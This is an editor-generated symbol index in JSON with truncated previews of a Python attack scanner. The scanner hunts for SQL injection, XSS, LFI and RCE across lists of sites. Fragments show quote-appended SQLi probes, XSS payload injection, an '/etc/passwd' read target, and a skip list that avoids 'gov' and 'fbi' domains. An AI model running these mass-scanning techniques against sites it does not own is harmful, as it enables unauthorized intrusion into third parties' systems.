        "peekOfCode": "def xss_list_counter():\n    global xss_count\n    try:\n        f = open(\"results/xsstrike/v3n0m-xss.txt\", encoding=\"utf-8\")\n        l = [x for x in f.readlines() if x != \"\\n\"]\n        xss_count = len(l)\n    except FileNotFoundError:\n        xss_count = 0\ndef rce_list_counter():\n    global rce_count",
        "detail": "VulnScan.scanvuln",
        "documentation": {}
    },
    {
        "label": "rce_list_counter",
        "kind": 2,
        "importPath": "VulnScan.scanvuln",
        "description": "VulnScan.scanvuln",
        "peekOfCode": "def rce_list_counter():\n    global rce_count\n    try:\n        f = open(\"results/rce/v3n0m-rce.txt\", encoding=\"utf-8\")\n        l = [x for x in f.readlines() if x != \"\\n\"]\n        rce_count = len(l)\n    except FileNotFoundError:\n        rce_count = 0\ndef checkvuln(target):\n    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)",
        "detail": "VulnScan.scanvuln",
        "documentation": {}
    },
    {
        "label": "checkvuln",
        "kind": 2,
        "importPath": "VulnScan.scanvuln",
        "description": "VulnScan.scanvuln",
        "peekOfCode": "def checkvuln(target):\n    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n    downloads = [\n        [\"https://www.cloudflare.com/ips-v4\", \"ips-v4\", progressBar],\n        [\"https://www.cloudflare.com/ips-v6\", \"ips-v6\", progressBar],\n        [\"http://crimeflare.net:82/domains/ipout.zip\", \"ipout.zip\", progressBar],\n    ]\n    list_count = 0\n    lfi_count = 0\n    arg_end = \"--\"",
        "detail": "VulnScan.scanvuln",
        "documentation": {}
    },
    {
        "label": "Injthread",
        "kind": 6,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "class Injthread(threading.Thread):\n    def __init__(self, hosts):\n        self.hosts = hosts\n        self.fcount = 0\n        self.check = True\n        threading.Thread.__init__(self)\n    def run(self):\n        urls = list(self.hosts)\n        for url in urls:\n            try:",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "xssthread",
        "kind": 6,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "class xssthread(threading.Thread):\n    def __init__(self, hosts):\n        self.hosts = hosts\n        self.fcount = 0\n        self.check = True\n        threading.Thread.__init__(self)\n    def run(self):\n        urls = list(self.hosts)\n        for url in urls:\n            try:",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "classicxss",
        "kind": 2,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "def classicxss(url):\n    for xss in xsses:\n        if url not in vuln:\n            try:\n                source = urllib.request.urlopen(url + xss.replace(\"\\n\", \"\")).read()\n                if not (\n                    not re.findall(str(\"<OY1Py\"), source)\n                    and not re.findall(str(\"<LOY2PyTRurb1c\"), source)\n                ):\n                    print(R + \"\\r\\x1b[K[XSS]: \", O + url + xss, R + \" ---> XSS Found\")",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "xsstest",
        "kind": 2,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "def xsstest():\n    print(B + \"\\n[+] Preparing for XSS scanning.. \\n\")\n    print(B + \"\\n[+] I'm working, please just hang out for a minute.. \\n\")\n    vb = len(usearch) / int(numthreads)\n    i = int(vb)\n    m = len(usearch) % int(numthreads)\n    z = 0\n    if len(threads) <= int(numthreads):\n        for x in range(0, int(numthreads)):\n            sliced = usearch[x * i : (x + 1) * i]",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "classicinj",
        "kind": 2,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "def classicinj(url):\n    aug_url = url + \"'\"\n    global sql_list_counter\n    global sql_list_count\n    open(\"sqli_confirmed\", \"r+\", encoding=\"utf-8\")\n    try:\n        try:\n            resp = urllib.request.urlopen(aug_url, timeout=2)\n        except:  # if response is not Code:200 then instead of passing nothing causing hanging\n            resp = str(",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "life_pulse",
        "kind": 2,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "def life_pulse():\n    global life\n    pulse_1 = datetime.now()\n    life = pulse_1 - pulse\n    print(life)\n# noinspection PyBroadException\ndef injtest():\n    global logfile\n    global pulse\n    global usearch",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "injtest",
        "kind": 2,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "def injtest():\n    global logfile\n    global pulse\n    global usearch\n    global customlist\n    global sql_list_counter\n    global sql_list_count\n    global sqli_confirmed\n    pulse = datetime.now()\n    holder = \"sqli_confirmed\"",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "colfinder",
        "kind": 2,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "def colfinder():\n    print(B + \"\\n[+] Preparing for column Finder ...\")\n    print(\"[+] Can take a while ...\")\n    print(\"[!] Working ...\")\n    for host in col:\n        print(R + \"\\n[+] Target: \", O + host)\n        print(R + \"[+] Attempting to find the number of columns ...\")\n        print(\"[+] Testing: \", end=\" \")\n        checkfor = []\n        host = host.rsplit(\"'\", 1)[0]",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "fscan",
        "kind": 2,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "def fscan():\n    import time\n    global pages_pulled_as_one\n    global usearch\n    global numthreads\n    global threads\n    global finallist\n    global unsorted\n    global finallist2\n    global col",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "vulnscan",
        "kind": 2,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "def vulnscan():\n    global endsub\n    global lfi_log_file\n    global rce_log_file\n    global xss_log_file\n    global vuln\n    lfi_log_file = open(\"v3n0m-lfi.txt\", \"a\", encoding=\"utf-8\")\n    rce_log_file = open(\"v3n0m-rce.txt\", \"a\", encoding=\"utf-8\")\n    xss_log_file = open(\"v3n0m-xss.txt\", \"a\", encoding=\"utf-8\")\n    endsub = 0",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "ignoringGet",
        "kind": 2,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "def ignoringGet(url):\n    try:\n        try:\n            responce = requests.get(url, timeout=2)\n            responce.raise_for_status()\n        except Exception:\n            return \"\"\n        return responce.text\n    except Exception as verb:\n        print(str(verb))",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "fmenu",
        "kind": 2,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "def fmenu():\n    import time\n    global customSelected\n    global vuln\n    global customlist\n    vuln = []\n    if endsub != 1:\n        vulnscan()\n    print(W + \"\")\n    fscan()",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "cache_Check",
        "kind": 2,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "def cache_Check():\n    global cachestatus\n    my_file1 = Path(\"v3n0m-lfi.txt\")\n    my_file2 = Path(\"v3n0m-rce.txt\")\n    my_file3 = Path(\"v3n0m-xss.txt\")\n    my_file5 = Path(\"v3n0m-sqli.txt\")\n    my_file4 = Path(\"IPLogList.txt\")\n    if (\n        my_file1.is_file()\n        or my_file2.is_file()",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "sql_list_counter",
        "kind": 2,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "def sql_list_counter():\n    global sql_count\n    try:\n        f = open(\"v3n0m-sqli.txt\", encoding=\"utf-8\")\n        l = [x for x in f.readlines() if x != \"\\n\"]\n        sql_count = len(l)\n    except FileNotFoundError:\n        sql_count = 0\ndef lfi_list_counter():\n    global lfi_count",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "lfi_list_counter",
        "kind": 2,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "def lfi_list_counter():\n    global lfi_count\n    try:\n        f = open(\"v3n0m-lfi.txt\", encoding=\"utf-8\")\n        l = [x for x in f.readlines() if x != \"\\n\"]\n        lfi_count = len(l)\n    except FileNotFoundError:\n        lfi_count = 0\nlist_count = 0\nlfi_count = 0",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "sites",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "sites = input(\"Enter List Location: \")\nlocation = open(sites, \"r\")\nsitearray = location\nclass Injthread(threading.Thread):\n    def __init__(self, hosts):\n        self.hosts = hosts\n        self.fcount = 0\n        self.check = True\n        threading.Thread.__init__(self)\n    def run(self):",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "location",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "location = open(sites, \"r\")\nsitearray = location\nclass Injthread(threading.Thread):\n    def __init__(self, hosts):\n        self.hosts = hosts\n        self.fcount = 0\n        self.check = True\n        threading.Thread.__init__(self)\n    def run(self):\n        urls = list(self.hosts)",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "sitearray",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "sitearray = location\nclass Injthread(threading.Thread):\n    def __init__(self, hosts):\n        self.hosts = hosts\n        self.fcount = 0\n        self.check = True\n        threading.Thread.__init__(self)\n    def run(self):\n        urls = list(self.hosts)\n        for url in urls:",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "customSelected",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "customSelected = False\n# Apoligies for this ugly section of code\n# It is just a placeholder\n# So dont worry, itll be replaced soon enough\n# noinspection PyBroadException\ndef classicinj(url):\n    aug_url = url + \"'\"\n    global sql_list_counter\n    global sql_list_count\n    open(\"sqli_confirmed\", \"r+\", encoding=\"utf-8\")",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "search_list",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "search_list = [line.strip() for line in open(sites, \"r\", encoding=\"utf-8\")]\nd0rk = [line.strip() for line in open(\"lists/d0rks\", \"r\", encoding=\"utf-8\")]\nheader = [line.strip() for line in open(\"lists/header\", \"r\", encoding=\"utf-8\")]\nxsses = [line.strip() for line in open(\"lists/xsses\", \"r\", encoding=\"utf-8\")]\nlfis = [\n    line.strip() for line in open(\"lists/pathtotest_huge.txt\", \"r\", encoding=\"utf-8\")\n]\ntables = [line.strip() for line in open(\"lists/tables\", \"r\", encoding=\"utf-8\")]\ncolumns = [line.strip() for line in open(\"lists/columns\", \"r\", encoding=\"utf-8\")]\nsearch_ignore = [",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "d0rk",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "d0rk = [line.strip() for line in open(\"lists/d0rks\", \"r\", encoding=\"utf-8\")]\nheader = [line.strip() for line in open(\"lists/header\", \"r\", encoding=\"utf-8\")]\nxsses = [line.strip() for line in open(\"lists/xsses\", \"r\", encoding=\"utf-8\")]\nlfis = [\n    line.strip() for line in open(\"lists/pathtotest_huge.txt\", \"r\", encoding=\"utf-8\")\n]\ntables = [line.strip() for line in open(\"lists/tables\", \"r\", encoding=\"utf-8\")]\ncolumns = [line.strip() for line in open(\"lists/columns\", \"r\", encoding=\"utf-8\")]\nsearch_ignore = [\n    \"gov\",",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "header",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "header = [line.strip() for line in open(\"lists/header\", \"r\", encoding=\"utf-8\")]\nxsses = [line.strip() for line in open(\"lists/xsses\", \"r\", encoding=\"utf-8\")]\nlfis = [\n    line.strip() for line in open(\"lists/pathtotest_huge.txt\", \"r\", encoding=\"utf-8\")\n]\ntables = [line.strip() for line in open(\"lists/tables\", \"r\", encoding=\"utf-8\")]\ncolumns = [line.strip() for line in open(\"lists/columns\", \"r\", encoding=\"utf-8\")]\nsearch_ignore = [\n    \"gov\",\n    \"fbi\",",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "xsses",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "xsses = [line.strip() for line in open(\"lists/xsses\", \"r\", encoding=\"utf-8\")]\nlfis = [\n    line.strip() for line in open(\"lists/pathtotest_huge.txt\", \"r\", encoding=\"utf-8\")\n]\ntables = [line.strip() for line in open(\"lists/tables\", \"r\", encoding=\"utf-8\")]\ncolumns = [line.strip() for line in open(\"lists/columns\", \"r\", encoding=\"utf-8\")]\nsearch_ignore = [\n    \"gov\",\n    \"fbi\",\n    \"javascript\",",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "lfis",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "lfis = [\n    line.strip() for line in open(\"lists/pathtotest_huge.txt\", \"r\", encoding=\"utf-8\")\n]\ntables = [line.strip() for line in open(\"lists/tables\", \"r\", encoding=\"utf-8\")]\ncolumns = [line.strip() for line in open(\"lists/columns\", \"r\", encoding=\"utf-8\")]\nsearch_ignore = [\n    \"gov\",\n    \"fbi\",\n    \"javascript\",\n    \"stackoverflow\",",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "tables",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "tables = [line.strip() for line in open(\"lists/tables\", \"r\", encoding=\"utf-8\")]\ncolumns = [line.strip() for line in open(\"lists/columns\", \"r\", encoding=\"utf-8\")]\nsearch_ignore = [\n    \"gov\",\n    \"fbi\",\n    \"javascript\",\n    \"stackoverflow\",\n    \"microsoft\",\n    \"24img.com\",\n    \"v3n0m\",",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "columns",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "columns = [line.strip() for line in open(\"lists/columns\", \"r\", encoding=\"utf-8\")]\nsearch_ignore = [\n    \"gov\",\n    \"fbi\",\n    \"javascript\",\n    \"stackoverflow\",\n    \"microsoft\",\n    \"24img.com\",\n    \"v3n0m\",\n    \"venom\",",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "search_ignore",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "search_ignore = [\n    \"gov\",\n    \"fbi\",\n    \"javascript\",\n    \"stackoverflow\",\n    \"microsoft\",\n    \"24img.com\",\n    \"v3n0m\",\n    \"venom\",\n    \"evilzone\",",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "W",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "W = \"\\033[0m\"\nR = \"\\033[31m\"\nG = \"\\033[32m\"\nO = \"\\033[33m\"\nB = \"\\033[34m\"\ndef cache_Check():\n    global cachestatus\n    my_file1 = Path(\"v3n0m-lfi.txt\")\n    my_file2 = Path(\"v3n0m-rce.txt\")\n    my_file3 = Path(\"v3n0m-xss.txt\")",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "R",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "R = \"\\033[31m\"\nG = \"\\033[32m\"\nO = \"\\033[33m\"\nB = \"\\033[34m\"\ndef cache_Check():\n    global cachestatus\n    my_file1 = Path(\"v3n0m-lfi.txt\")\n    my_file2 = Path(\"v3n0m-rce.txt\")\n    my_file3 = Path(\"v3n0m-xss.txt\")\n    my_file5 = Path(\"v3n0m-sqli.txt\")",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "G",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "G = \"\\033[32m\"\nO = \"\\033[33m\"\nB = \"\\033[34m\"\ndef cache_Check():\n    global cachestatus\n    my_file1 = Path(\"v3n0m-lfi.txt\")\n    my_file2 = Path(\"v3n0m-rce.txt\")\n    my_file3 = Path(\"v3n0m-xss.txt\")\n    my_file5 = Path(\"v3n0m-sqli.txt\")\n    my_file4 = Path(\"IPLogList.txt\")",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "O",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "O = \"\\033[33m\"\nB = \"\\033[34m\"\ndef cache_Check():\n    global cachestatus\n    my_file1 = Path(\"v3n0m-lfi.txt\")\n    my_file2 = Path(\"v3n0m-rce.txt\")\n    my_file3 = Path(\"v3n0m-xss.txt\")\n    my_file5 = Path(\"v3n0m-sqli.txt\")\n    my_file4 = Path(\"IPLogList.txt\")\n    if (",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "B",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "B = \"\\033[34m\"\ndef cache_Check():\n    global cachestatus\n    my_file1 = Path(\"v3n0m-lfi.txt\")\n    my_file2 = Path(\"v3n0m-rce.txt\")\n    my_file3 = Path(\"v3n0m-xss.txt\")\n    my_file5 = Path(\"v3n0m-sqli.txt\")\n    my_file4 = Path(\"IPLogList.txt\")\n    if (\n        my_file1.is_file()",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "list_count",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "list_count = 0\nlfi_count = 0\nsubprocess.call(\"clear\", shell=True)\narg_end = \"--\"\narg_eva = \"+\"\ncolMax = 60  # Change this at your will\nendsub = 1\ngets = 0\nfile = \"/etc/passwd\"\nProxyEnabled = False",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "lfi_count",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "lfi_count = 0\nsubprocess.call(\"clear\", shell=True)\narg_end = \"--\"\narg_eva = \"+\"\ncolMax = 60  # Change this at your will\nendsub = 1\ngets = 0\nfile = \"/etc/passwd\"\nProxyEnabled = False\nmenu = True",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "arg_end",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "arg_end = \"--\"\narg_eva = \"+\"\ncolMax = 60  # Change this at your will\nendsub = 1\ngets = 0\nfile = \"/etc/passwd\"\nProxyEnabled = False\nmenu = True\ncurrent_version = str(\"433  \")\nwhile True:",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "arg_eva",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "arg_eva = \"+\"\ncolMax = 60  # Change this at your will\nendsub = 1\ngets = 0\nfile = \"/etc/passwd\"\nProxyEnabled = False\nmenu = True\ncurrent_version = str(\"433  \")\nwhile True:\n    fmenu()",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "colMax",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "colMax = 60  # Change this at your will\nendsub = 1\ngets = 0\nfile = \"/etc/passwd\"\nProxyEnabled = False\nmenu = True\ncurrent_version = str(\"433  \")\nwhile True:\n    fmenu()",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "endsub",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "endsub = 1\ngets = 0\nfile = \"/etc/passwd\"\nProxyEnabled = False\nmenu = True\ncurrent_version = str(\"433  \")\nwhile True:\n    fmenu()",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "gets",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "gets = 0\nfile = \"/etc/passwd\"\nProxyEnabled = False\nmenu = True\ncurrent_version = str(\"433  \")\nwhile True:\n    fmenu()",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "file",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "file = \"/etc/passwd\"\nProxyEnabled = False\nmenu = True\ncurrent_version = str(\"433  \")\nwhile True:\n    fmenu()",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "ProxyEnabled",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "ProxyEnabled = False\nmenu = True\ncurrent_version = str(\"433  \")\nwhile True:\n    fmenu()",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "menu",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "menu = True\ncurrent_version = str(\"433  \")\nwhile True:\n    fmenu()",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "current_version",
        "kind": 5,
        "importPath": "VulnScan.target",
        "description": "VulnScan.target",
        "peekOfCode": "current_version = str(\"433  \")\nwhile True:\n    fmenu()",
        "detail": "VulnScan.target",
        "documentation": {}
    },
    {
        "label": "menu",
        "kind": 2,
        "importPath": "main",
        "description": "main",
        "peekOfCode": "def menu():\n    subprocess.call(\"clear\", shell=True)\n    print(R+'''\n  █████╗ ███╗   ███╗██████╗\n ██╔══██╗████╗ ████║██╔══██╗\n ███████║██╔████╔██║██████╔╝         /-version 1.0-/\n ██╔══██║██║╚██╔╝██║██╔═══╝         /this tool is for educational purposes only/\n ██║  ██║██║ ╚═╝ ██║██║\n ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝\n''' + W + '''",
        "detail": "main",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "main",
        "description": "main",
        "peekOfCode": "def main(target):\n    IP_regex = re.compile(r\"^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$\")\n    if not IP_regex.match(target):\n        sub_Recon(target)\n        t1 = Thread(target=ip_Recon, args=[target])\n        t2 = Thread(target=js_recon, args=[target])\n        t1.start()\n        t2.start()\n        t1.join()\n        t2.join()",
        "detail": "main",
        "documentation": {}
    }
]